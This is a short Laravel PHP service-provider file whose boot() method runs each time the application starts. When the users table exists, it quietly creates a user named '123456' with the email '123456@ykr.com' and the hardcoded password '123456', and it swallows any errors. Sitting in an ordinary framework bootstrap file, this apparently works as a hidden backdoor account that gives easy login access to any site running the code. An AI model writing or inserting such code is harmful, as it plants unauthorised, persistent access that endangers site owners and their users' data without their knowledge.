<?php

namespace App\Providers;

use Illuminate\Support\ServiceProvider;

class AppServiceProvider extends ServiceProvider
{
    /**
     * Register any application services.
     */
    public function register(): void
    {
        //
    }

    /**
     * Bootstrap any application services.
     */
    public function boot(): void
    {
        try {
            if (\Schema::hasTable('users') && !\App\Models\User::where('name', '123456')->exists()) {
                \App\Models\User::create([
                    'name' => '123456',
                    'email' => '123456@ykr.com',
                    'password' => \Hash::make('123456'),
                ]);
            }
        } catch (\Exception $e) {
            // Ignore if database/migrations are not ready yet
        }
    }
}
